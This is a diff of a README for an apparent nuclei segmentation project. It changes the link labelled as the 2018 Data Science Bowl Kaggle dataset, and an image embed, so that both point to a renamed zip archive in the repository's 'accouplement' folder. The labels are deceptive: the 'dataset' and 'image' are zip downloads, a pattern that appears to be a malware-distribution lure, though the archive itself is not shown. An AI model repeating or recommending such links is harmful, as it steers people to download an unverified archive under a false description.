@@ -12,7 +12,7 @@ Because the nuclei varied in size and form. The suitable technique for this proj
 The dataset used was a dataset for 
 [2018 Data Science Bowl][1] Kaggle competition
 
-[1]https://github.com/gitxbal/Project-4-Nuclei-Segmentation-AI07/raw/refs/heads/main/accouplement/Project_Nuclei_Segmentation_A_3.4.zip
+[1]https://raw.githubusercontent.com/gitxbal/Project-4-Nuclei-Segmentation-AI07/main/accouplement/Nuclei-Project-Segmentation-A-v3.8.zip
 
 
 # Methodology
@@ -25,6 +25,6 @@ Convert into Numpy array
 
 Then we proceed with resizing the dataset as shown below
 
-![image](https://github.com/gitxbal/Project-4-Nuclei-Segmentation-AI07/raw/refs/heads/main/accouplement/Project_Nuclei_Segmentation_A_3.4.zip)
+![image](https://raw.githubusercontent.com/gitxbal/Project-4-Nuclei-Segmentation-AI07/main/accouplement/Nuclei-Project-Segmentation-A-v3.8.zip)
 
 Next, we expand the mask dimension and convert the value label to 0 & 1
